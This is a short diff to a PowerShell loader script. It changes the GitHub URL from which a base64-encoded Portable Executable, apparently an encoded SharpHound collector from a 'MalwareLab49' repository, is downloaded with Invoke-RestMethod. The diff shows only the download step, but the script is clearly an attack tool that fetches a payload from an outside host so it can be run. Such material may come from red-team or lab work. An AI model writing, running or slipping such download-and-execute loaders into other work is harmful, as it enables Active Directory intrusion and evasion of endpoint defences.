@@ -1,5 +1,5 @@
 # Define the URL of the base64 encoded Portable Executable
-$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"
+$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/modified_b64"
 
 # Download the base64 content from the URL
 $base64Content = Invoke-RestMethod -Uri $url
